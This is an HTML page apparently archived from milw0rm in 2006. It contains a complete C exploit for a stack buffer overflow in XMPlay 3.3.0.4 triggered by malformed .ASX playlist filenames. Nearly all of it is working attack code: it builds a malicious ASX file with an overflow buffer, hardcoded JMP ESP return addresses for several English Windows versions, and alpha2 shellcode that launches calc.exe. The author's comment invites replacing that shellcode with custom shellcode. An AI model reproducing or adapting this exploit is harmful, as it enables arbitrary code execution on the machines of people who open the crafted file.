<html><head><title>XMPlay 3.3.0.4 (ASX Filename) Local Buffer Overflow Exploit</title></head><pre>/*
===================================================================
	0-day XMPlay 3.3.0.4 .ASX Filename Buffer Overflow Exploit
===================================================================
XMPlay 3.3.0.4 and lower experiance a stack-based buffer overflow when
loading malformed .ASX files

This merely executes CALC.exe but you could always add your own custom
shellcode (alpha2)

===============
ASX
&lt;ASX VERSION=&quot;3&quot;&gt;
&lt;ENTRY&gt;
    &lt;REF HREF=&quot;file://[EXPLOIT HERE]&quot;
&lt;/ENTRY&gt;
&lt;/ASX&gt;
===============


Reported Exploit Date: 11/21/2006

*/


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
int main(int argc, char *argv[])
{

	FILE *Exploit;
	char buffer[512];

	/* Executes Calc.exe Alpha2 Shellcode Provided by Expanders &lt;expanders[at]gmail[dot]com&gt; */
	unsigned char scode[] =
	&quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;
	&quot;YlHhQTs0s0c0LKcuwLLK1ls52Xs1JONkRofxNkcoUpUQZKCylK4tLKuQxnTqo0LYnLMTkpptUWiQ9ZdM&quot;
	&quot;5QO2JKZT5k2tUtUTPuKULKQOfDc1zKPfNkflrkNkSowlvaZKLK5LlKgqxkMYqL14wtYSFQkpcTNkQPtp&quot;
	&quot;LEiPd8VlNkqPVllKPp7lNMLK0htHjKuYnkMPnP7pc05PLKsXUlsovQxvU0PVOy9hlCo0SKRpsXhoxNip&quot;
	&quot;sPu8LX9nMZvnv79oM7sSU1rLsSdnu5rX3UuPA&quot;;



	char NOPSled[50];
	char tail[] = &quot;.mid\x22\r\n&quot;;
	int JMP, x;

	printf(&quot;\n======================================================================\n&quot;);
	printf(&quot;XMPlay 3.3.0.4 and prior ASX Filename Buffer Overflow Exploit\n&quot;);
	printf(&quot;Discovered and Coded By: Greg Linares &lt;GLinares.code[at]gmail[dot]com&gt;\n&quot;);
	printf(&quot;Usage: %s &lt;output ASX file&gt; &lt;JMP&gt;\n&quot;, argv[0]);
	printf(&quot;\n JMP Options\n&quot;);
	printf(&quot;1 = English Windows XP SP 2 User32.dll &lt;JMP ESP 0x77db41bc&gt;\n&quot;);
	printf(&quot;2 = English Windows XP SP 1 User32.dll &lt;JMP ESP 0x77d718fc&gt;\n&quot;);
	printf(&quot;3 = English Windows 2003 SP0 and SP1 User32.dll &lt;JMP ESP 0x77d74adc&gt;\n&quot;);
	printf(&quot;4 = English Windows 2000 SP 4 User32.dll  &lt;JMP ESP 0x77e3c256&gt;\n&quot;);
	printf(&quot;====================================================================\n\n\n&quot;);


	if (argc &lt; 2) {
		printf(&quot;Invalid Number Of Arguments\n&quot;);
		return 1;
	}


	Exploit = fopen(argv[1],&quot;w&quot;);
    if ( !Exploit )
    {
        printf(&quot;\nCouldn't Open File!&quot;);
        return 1;
    }

	memset(buffer, 0, 505);
	memset(NOPSled, 0, 20);


	fputs(&quot;&lt;ASX VERSION=\x22\x33\x22&gt;\r\n&lt;ENTRY&gt;\r\n&quot;, Exploit);
	fputs(&quot;&lt;REF HREF=\x22&quot;, Exploit);
	fputs(&quot;file://C:\\&quot;, Exploit);

	for (x=0;x&lt;498;x++) {
		strcat(buffer, &quot;A&quot;);
	}

	fputs(buffer, Exploit);
	if (atoi(argv[2]) &lt;= 0) {
		JMP = 1;
	} else if (atoi(argv[2]) &gt; 4) {
		JMP = 1;
	} else {
		JMP = atoi(argv[2]);
	}
	switch(JMP) {
		case 1:
			printf(&quot;Using English Windows XP SP2 JMP...\n&quot;);
			fputs(&quot;\xbc\x41\xdb\x77&quot;, Exploit);
			break;
		case 2:
			printf(&quot;Using English Windows XP SP1 JMP...\n&quot;);
			fputs(&quot;\xfc\x18\xd7\x77&quot;, Exploit);
			break;
		case 3:
			printf(&quot;Using English Windows 2003 SP0 &amp; SP1 JMP...\n&quot;);
			fputs(&quot;\xdc\x4a\xd7\x77&quot;, Exploit);
			break;
		case 4:
			printf(&quot;Using English Windows 2000 SP 4 JMP...\n&quot;);
			fputs(&quot;\x56\xc2\xe3\x77&quot;, Exploit);
			break;
	}

	fputs(scode, Exploit);

	for (x=0;x&lt;20;x++) {
		strcat(NOPSled, &quot;\x90&quot;);
	}

	fputs(NOPSled, Exploit);
	fputs(tail, Exploit);
	fputs(&quot;&lt;/ENTRY&gt;\r\n&lt;/ASX&gt;\r\n&quot;, Exploit);



	printf(&quot;Exploit Succeeded...\n Output File: %s\n\n&quot;, argv[1]);


	printf(&quot;Exploit Coded by Greg Linares (GLinares.code[at]gmail[dot]com)\n&quot;);
	printf(&quot;Greetz to: Jerome Athias and Expanders - Thanks For The Ideas, Tools and Alpha2 Shell Code\n&quot;);

	fclose(Exploit);
	return 0;
}

// milw0rm.com [2006-11-21]</pre></html>